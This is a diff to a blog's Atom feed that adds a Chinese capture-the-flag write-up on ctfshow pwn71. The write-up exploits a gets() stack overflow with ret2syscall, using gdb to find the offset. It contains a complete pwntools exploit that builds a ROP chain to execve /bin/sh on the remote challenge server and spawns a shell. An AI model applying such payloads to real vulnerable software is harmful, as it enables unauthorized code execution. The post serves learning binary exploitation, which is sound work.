@@ -6,7 +6,7 @@
   <link href="https://jiutian521.github.io/atom.xml" rel="self"/>
   
   <link href="https://jiutian521.github.io/"/>
-  <updated>2025-11-25T16:44:05.616Z</updated>
+  <updated>2025-11-27T04:53:21.910Z</updated>
   <id>https://jiutian521.github.io/</id>
   
   <author>
@@ -15,6 +15,31 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>用gdb调试ret2syscall</title>
+    <link href="https://jiutian521.github.io/posts/e4901ff4.html"/>
+    <id>https://jiutian521.github.io/posts/e4901ff4.html</id>
+    <published>2025-11-26T16:00:00.000Z</published>
+    <updated>2025-11-27T04:53:21.910Z</updated>
+    
+    <content type="html"><![CDATA[<p>题目本身并不难，但是坑还是有的，我们重点关注gdb的使用</p><h1 id="eg-ctfshow-pwn71（32位ret2sycall）"><a href="#eg-ctfshow-pwn71（32位ret2sycall）" class="headerlink" title="eg ctfshow pwn71（32位ret2sycall）"></a>eg ctfshow pwn71（32位ret2sycall）</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  int v4; // [esp+1Ch] [ebp-64h] BYREF</span><br><span class="line"></span><br><span class="line">  setvbuf(stdout, 0, 2, 0);</span><br><span class="line">  setvbuf(stdin, 0, 1, 0);</span><br><span class="line">  puts(&quot;===============CTFshow--PWN===============&quot;);</span><br><span class="line">  puts(&quot;Try to use ret2syscall!&quot;);</span><br><span class="line">  gets(&amp;v4);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>本题是静态编译，函数很多，自然想到ret2syscall。在v4存在明显栈溢出漏洞</p><p>这里的坑是ida给的这个0x64的偏移实际上是不准的，需要我们用gdb算一下</p><h1 id="用gdb计算偏移量"><a href="#用gdb计算偏移量" class="headerlink" title="用gdb计算偏移量"></a>用gdb计算偏移量</h1><p>我们先不需要写exp，直接gdb程序即可</p><p><img src="https://github.com/JiuTian521/picx-images-hosting/raw/master/Snipaste_2025-11-27_11-14-06.7lkfl27q25.webp"></p><p>先用cyclic 200生成一堆垃圾数，复制下来，或者自己手动打一堆aaaaaaa……也可以</p><p>在gets函数前随便找个地方下断点，然后按r，走到gets输入的地方，把那一堆垃圾数据粘贴并发送过去</p><p>然后用这个指令计算偏移</p><blockquote><p>cyclic -l &lt;EIP&#x2F;RIP的值&gt;</p></blockquote><p><img src="https://github.com/JiuTian521/picx-images-hosting/raw/master/Snipaste_2025-11-27_11-31-11.5xb2nw3ah8.webp"></p><p>得到偏移量为112</p><h1 id="灵活使用gadget"><a href="#灵活使用gadget" class="headerlink" title="灵活使用gadget"></a>灵活使用gadget</h1><p>下一步是用ROPgetgad查找pop寄存器，但是我们不可能每次都正好找到完美符合条件的</p><p><img src="https://github.com/JiuTian521/picx-images-hosting/raw/master/Snipaste_2025-11-27_11-36-26.6bhieriaq7.webp"></p><p>这题我们是没法找到单独的pop ecx的，只有一段和ebx连在一起的gadget，不过也可以用，把二者合起来就是了</p><p>exp如下</p><figure class="highlight plaintext"><figcaption><span>pwn import *</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">context(arch = &#x27;i386&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;,terminal = [&#x27;tmux&#x27;, &#x27;split-window&#x27;, &#x27;-h&#x27;])</span><br><span class="line"> </span><br><span class="line">#elf = ELF(&#x27;./pwn71&#x27;)</span><br><span class="line"> </span><br><span class="line">io = remote(&#x27;pwn.challenge.ctf.show&#x27;,28251)</span><br><span class="line"> </span><br><span class="line">#io=process(&#x27;./pwn71&#x27;)</span><br><span class="line"></span><br><span class="line">#io=gdb.debug(&quot;./pwn71&quot;,&#x27;b*0x08048E93&#x27;)</span><br><span class="line"></span><br><span class="line">pop_eax = 0x080bb196</span><br><span class="line">pop_edx = 0x0806eb6a </span><br><span class="line">pop_ecx_ebx = 0x0806eb91 </span><br><span class="line">int_0x80 = 0x08049421</span><br><span class="line">bin_sh_addr = 0x080BE408</span><br><span class="line"></span><br><span class="line">#offset = cyclic(200)</span><br><span class="line">offset = 112</span><br><span class="line">payload = offset*b&#x27;a&#x27;</span><br><span class="line">payload = flat([</span><br><span class="line">    offset * b&#x27;a&#x27;,</span><br><span class="line">    0,</span><br><span class="line">    pop_edx,</span><br><span class="line">    0,            </span><br><span class="line">    pop_ecx_ebx,</span><br><span class="line">    bin_sh_addr,     </span><br><span class="line">    pop_eax, 0xb,           </span><br><span class="line">    int_0x80</span><br><span class="line">])</span><br><span class="line"></span><br><span class="line">io.sendlineafter(&quot;Try to use ret2syscall!&quot;, payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="用gdb观察程序流程"><a href="#用gdb观察程序流程" class="headerlink" title="用gdb观察程序流程"></a>用gdb观察程序流程</h1><p><img src="https://github.com/JiuTian521/picx-images-hosting/raw/master/Snipaste_2025-11-27_11-52-02.6wr612wrpv.webp"></p><p>可以看到栈上已经被覆盖了参数</p><p>我们重点看汇编窗口<br><img src="https://github.com/JiuTian521/picx-images-hosting/raw/master/Snipaste_2025-11-27_11-59-02.4g4xm5ywre.webp"></p><p>可以看到四个寄存器已经按照我们payload写的顺序那样，依次被执行对应的操作，</p><p>这里的payload的顺序不重要，因为int80会聪明的自己按照顺序去寻找对应的寄存器，所以只需要保证寄存器的内容正确即可</p><p><img src="https://github.com/JiuTian521/picx-images-hosting/raw/master/Snipaste_2025-11-27_12-04-12.7pqccfbmq.webp"></p><p>我们走到int80，输入i r查看所有寄存器，发现每个寄存器都完美的执行了我们想要的操作</p><p>我们也可以在main函数ret的时候用下面的指令查看</p><blockquote><p>x&#x2F;10wx $esp</p></blockquote><p>意思是查看（x）栈顶指针（$esp）位置开始的 10 个（10）单位的数据，每个单位是 4 字节（w），并用十六进制（x）显示出来</p><p><img src="https://github.com/JiuTian521/picx-images-hosting/raw/master/Snipaste_2025-11-27_12-09-57.7w79e9mlvk.webp"></p><p>我们继续按c走完，成功得到shell<br><img src="https://github.com/JiuTian521/picx-images-hosting/raw/master/Snipaste_2025-11-27_12-06-59.7w79e9irn3.webp"></p><h1 id="使用gdb的注意事项"><a href="#使用gdb的注意事项" class="headerlink" title="使用gdb的注意事项"></a>使用gdb的注意事项</h1><p>1.gets函数是在接收到换行符才会停止输入，所以我们必须用sendline去发payload，如果用send会导致发送完payload后程序还在等待我们输入，直接卡死</p><p>2.我们通过exp去打开gdb时要按c走到断点，千万不能按r，因为程序已经运行了，如果再按一遍r相当于重开了一个新的程序</p><p>3.我们手动输入时，一值n到gets，这时候gdb窗口会换行，这就在提示我们需要输入了，但我们千万不要在gdb窗口输入，而应该去程序执行的窗口输入，否则gdb会卡死</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;题目本身并不难，但是坑还是有的，我们重点关注gdb的使用&lt;/p&gt;
+&lt;h1 id=&quot;eg-ctfshow-pwn71（32位ret2sycall）&quot;&gt;&lt;a href=&quot;#eg-ctfshow-pwn71（32位ret2sycall）&quot; class=&quot;headerlink&quot; t</summary>
+      
+    
+    
+    
+    <category term="pwn入门" scheme="https://jiutian521.github.io/categories/pwn%E5%85%A5%E9%97%A8/"/>
+    
+    
+    <category term="ret2syscall" scheme="https://jiutian521.github.io/tags/ret2syscall/"/>
+    
+  </entry>
   
   <entry>
     <title>IDA常见函数总结</title>
